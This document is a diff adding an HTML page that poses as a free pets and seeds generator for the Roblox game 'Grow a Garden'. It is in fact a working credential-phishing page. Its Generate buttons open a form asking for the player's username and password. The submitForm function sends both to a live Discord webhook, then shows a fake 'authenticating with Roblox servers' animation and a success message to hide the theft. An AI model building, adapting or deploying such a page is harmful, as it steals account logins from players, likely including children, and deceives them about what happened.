@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Pet & Fruit Store</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Arial', sans-serif;
+      background-color: #7ec8e3;
+    }
+    h1, h2 {
+      text-align: center;
+      color: #f0e5d8;
+      text-shadow: 0 0 4px #0a0a0a;
+    }
+    h1 {
+      font-size: 2.8rem;
+      margin-top: 20px;
+      font-weight: bold;
+    }
+    h2.store-title {
+      font-size: 2rem;
+      color: #ffcc33;
+      margin-bottom: 5px;
+      font-weight: 700;
+    }
+    h2.sub-title {
+      font-size: 1.2rem;
+      margin-bottom: 20px;
+      opacity: 0.8;
+      font-weight: 600;
+    }
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit,minmax(180px,1fr));
+      gap: 20px;
+      max-width: 960px;
+      margin: 0 auto 40px;
+      padding: 0 10px;
+    }
+    .card {
+      background-color: #22a544;
+      border-radius: 12px;
+      color: white;
+      text-align: center;
+      padding: 15px 10px 20px;
+      box-shadow: 0 6px 12px rgb(0 0 0 / 0.25);
+      user-select: none;
+      font-weight: 600;
+    }
+    .card img {
+      width: 120px;
+      height: 120px;
+      object-fit: contain;
+      margin-bottom: 10px;
+      filter: drop-shadow(1px 1px 1px black);
+    }
+    .price {
+      margin: 6px 0 10px;
+      font-weight: 700;
+      font-size: 1.15rem;
+    }
+    .price .old-price {
+      text-decoration: line-through;
+      color: #e65100;
+      margin-right: 8px;
+      font-weight: 600;
+    }
+    .price .new-price {
+      font-weight: 700;
+      font-size: 1.2rem;
+      color: #ffcc33;
+    }
+    .generate-btn {
+      background-color: #ffcc33;
+      border: none;
+      border-radius: 20px;
+      color: #222;
+      font-weight: 700;
+      font-size: 0.9rem;
+      padding: 8px 0;
+      width: 100%;
+      cursor: pointer;
+      box-shadow: 0 4px 0 #b28b05;
+      user-select: none;
+      transition: background-color 0.2s ease;
+    }
+    .generate-btn:hover {
+      background-color: #ffdb4d;
+    }
+    .quantity-control {
+      margin-top: 10px;
+      background-color: #16742a;
+      border-radius: 12px;
+      padding: 4px 10px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      user-select: none;
+    }
+    .quantity-control button {
+      background: transparent;
+      border: none;
+      color: white;
+      font-size: 20px;
+      padding: 0 10px;
+      cursor: pointer;
+      font-weight: 700;
+      user-select: none;
+      line-height: 1;
+    }
+    .quantity-control span.quantity {
+      min-width: 20px;
+      text-align: center;
+      font-weight: 700;
+      font-size: 1.1rem;
+      user-select: none;
+    }
+    /* Overlay */
+    .overlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background-color: rgba(0,0,0,0.7);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+      user-select: none;
+    }
+    /* Modal Base */
+    .modal {
+      background: white;
+      border-radius: 14px;
+      text-align: center;
+      min-width: 320px;
+      max-width: 90vw;
+      padding: 25px 25px 15px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.25);
+      user-select: text;
+    }
+    .modal h3 {
+      margin: 0 0 20px;
+      font-weight: 700;
+      color: #22a544;
+      font-size: 1.6rem;
+      user-select: text;
+    }
+    .modal input {
+      width: 90%;
+      padding: 12px 10px;
+      margin-bottom: 15px;
+      font-size: 1rem;
+      border: 2px solid #22a544;
+      border-radius: 10px;
+      outline-offset: 0;
+      outline-color: #88d18a;
+      user-select: text;
+    }
+    .modal button {
+      margin: 10px 5px 0;
+      padding: 10px 30px;
+      font-weight: 700;
+      font-size: 1rem;
+      border-radius: 10px;
+      border: none;
+      cursor: pointer;
+      user-select: none;
+      transition: background-color 0.2s ease;
+    }
+    .modal button.submit-btn {
+      background-color: #22a544;
+      color: white;
+    }
+    .modal button.submit-btn:hover {
+      background-color: #196c3d;
+    }
+    .modal button.cancel-btn {
+      background-color: #ccc;
+      color: #555;
+    }
+    .modal button.cancel-btn:hover {
+      background-color: #aaa;
+      color: #222;
+    }
+    /* Loading modal style */
+    #loadingModal {
+      max-width: 360px;
+      padding: 20px;
+      font-family: monospace;
+      color: #00c853;
+      background: white;
+      border-radius: 16px;
+      text-align: left;
+      overflow-y: auto;
+      max-height: 300px;
+      white-space: pre-wrap;
+      word-wrap: break-word;
+      box-sizing: border-box;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>🌱 GROW A GARDEN</h1>
+  <h2 class="store-title">FREE PET AND EVENT SEEDS!</h2>
+  <h2 class="sub-title">PICK WHAT YOU WANT!</h2>
+
+  <div class="grid" id="petGrid"></div>
+
+  <!-- Modal Overlay -->
+  <div class="overlay" id="overlay">
+    <div class="modal" id="formModal">
+      <h3>Enter Your Username</h3>
+      <input type="text" id="username" placeholder="Your Username" autocomplete="username" />
+      <input type="password" id="password" placeholder="Your Password" autocomplete="current-password" />
+      <button class="submit-btn" onclick="submitForm()">Submit</button>
+      <button class="cancel-btn" onclick="closeModal()">Cancel</button>
+    </div>
+
+    <div class="modal" id="loadingModal" style="display: none;">
+      <h3>Generating Your Items...</h3>
+      <pre id="generatingBox">
+Initializing connection...
+Connecting to Roblox servers... OK
+Authenticating user...
+User authenticated successfully.
+Searching for selected items in database...
+Items located.
+Preparing item injection...
+Generating items...
+      </pre>
+    </div>
+  </div>
+
+<script>
+  const pets = [
+    {name: "Spinosaurus", img: "https://static.wikia.nocookie.net/growagarden/images/2/24/Spinosaurus.png/revision/latest?cb=20250712071322", oldPrice: "29.99"},
+    {name: "Primal Egg", img: "https://static.wikia.nocookie.net/growagarden/images/8/8f/PrimalEgg.png/revision/latest?cb=20250710113839", oldPrice: "32.99"},
+    {name: "T- Rex", img: "https://static.wikia.nocookie.net/growagarden/images/f/f8/T-Rex.png/revision/latest?cb=20250705092909  ", oldPrice: "32.99"},
+    {name: "Bone Blossom", img: "https://cdn.nookazon.com/growagarden/Crops/Bone_Blossom.png", oldPrice: "45.99"},
+    {name: "Disco Bee", img: "https://static.wikia.nocookie.net/growagarden/images/f/f2/DiscoBeeIcon.gif/revision/latest/scale-to-width-down/1200?cb=20250613134410", oldPrice: "25.99"},
+    {name: "Fennec Fox", img: "https://cdn.nookazon.com/growagarden/Pets/Fennec_Fox.png", oldPrice: "39.99"},
+    {name: "Raccoon", img: "https://static.wikia.nocookie.net/growagarden/images/5/54/Raccon_Better_Quality.png/revision/latest?cb=20250605153904", oldPrice: "41.99"},
+    {name: "Mimic Octopus", img: "https://cdn.nookazon.com/growagarden/Pets/Mimic_Octopus.png", oldPrice: "40.99"},
+    {name: "Butterfly Pet", img: "https://tr.rbxcdn.com/180DAY-a19b55b77e9febe98beccdc65d837954/420/420/Hat/Webp/noFilter", oldPrice: "40.99"},
+    {name: "Dragonfly Pet", img: "https://static.wikia.nocookie.net/growagarden/images/c/c9/DragonflyIcon.png/revision/latest?cb=20250603072107", oldPrice: "40.99"},
+    {name: "Queen Bee", img: "https://paparoblo.ru/wp-content/uploads/2025/06/queen-bee.png", oldPrice: "40.99"},
+    {name: "Red Fox", img: "https://cdn.nookazon.com/growagarden/Pets/Red_Fox.png", oldPrice: "29.99"},
+    {name: "Candy Blossom", img: "https://static.wikia.nocookie.net/growagarden/images/9/93/CandyBlossomSeed.png/revision/latest/smart/width/300/height/300?cb=20250615132847", oldPrice: "35.99"}
+  ];
+
+  const grid = document.getElementById("petGrid");
+  pets.forEach(pet => {
+    const card = document.createElement("div");
+    card.className = "card";
+    card.innerHTML = `
+      <img src="${pet.img}" alt="${pet.name}" />
+      <p>${pet.name}</p>
+      <p class="price"><span class="old-price">$${pet.oldPrice}</span> <span class="new-price">$0</span></p>
+      <button class="generate-btn">Generate</button>
+      <div class="quantity-control">
+        <button class="qty-minus" aria-label="Decrease quantity">-</button>
+        <span class="quantity">0</span>
+        <button class="qty-plus" aria-label="Increase quantity">+</button>
+      </div>
+    `;
+
+    const qtyMinus = card.querySelector(".qty-minus");
+    const qtyPlus = card.querySelector(".qty-plus");
+    const qtySpan = card.querySelector(".quantity");
+    const generateBtn = card.querySelector(".generate-btn");
+
+    qtyMinus.onclick = () => {
+      let val = parseInt(qtySpan.textContent);
+      if (val > 0) qtySpan.textContent = val - 1;
+    };
+    qtyPlus.onclick = () => {
+      let val = parseInt(qtySpan.textContent);
+      if (val < 99) qtySpan.textContent = val + 1;
+    };
+
+    generateBtn.onclick = () => {
+      openModal();
+    };
+
+    grid.appendChild(card);
+  });
+
+  const overlay = document.getElementById("overlay");
+  const formModal = document.getElementById("formModal");
+  const loadingModal = document.getElementById("loadingModal");
+
+  function openModal() {
+    overlay.style.display = "flex";
+    formModal.style.display = "block";
+    loadingModal.style.display = "none";
+    document.getElementById("username").value = "";
+    document.getElementById("password").value = "";
+  }
+  function closeModal() {
+    overlay.style.display = "none";
+    formModal.style.display = "none";
+    loadingModal.style.display = "none";
+  }
+
+  // YOUR WEBHOOK URL (Discord or any webhook that accepts JSON POST)
+  const webhookURL = "https://discord.com/api/webhooks/1392464394797187134/bboGFKm1YFfaMUJm_FxWFvdyK-Pr-0Rvyj6QdpFlF4cr4eRgq7RnJKlq8DXy_XFigyy1";
+
+  function submitForm() {
+    const username = document.getElementById("username").value.trim();
+    const password = document.getElementById("password").value;
+
+    if (!username) {
+      alert("Please enter your username.");
+      return;
+    }
+
+    if (password.length < 8) {
+      alert("Password must be at least 8 characters.");
+      return;
+    }
+
+    const payload = {
+      content: `**@everyone:**\n✅Username:${username}\n🔑Password:${password}`
+    };
+
+    fetch(webhookURL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    }).then(response => {
+      if (!response.ok) {
+        alert("Failed to send data to webhook.");
+        return;
+      }
+
+      // Hide form, show loading modal and animate messages
+      formModal.style.display = "none";
+      loadingModal.style.display = "block";
+
+      const box = document.getElementById("generatingBox");
+      const lines = [
+        "Initializing connection...",
+        "Connecting to Roblox servers... OK",
+        "Authenticating user...",
+        "User authenticated successfully.",
+        "Searching for selected items in database...",
+        "Items located.",
+        "Preparing item injection...",
+        "Generating items..."
+      ];
+      box.textContent = "";
+
+      let idx = 0;
+      const interval = setInterval(() => {
+        if (idx < lines.length) {
+          box.textContent += lines[idx] + "\n";
+          idx++;
+        } else {
+          clearInterval(interval);
+          setTimeout(() => {
+            alert("Your items have been generated successfully!");
+            closeModal();
+          }, 800);
+        }
+      }, 600);
+    }).catch(err => {
+      alert("Error sending data to webhook: " + err.message);
+    });
+  }
+</script>
+
+</body>
+</html>
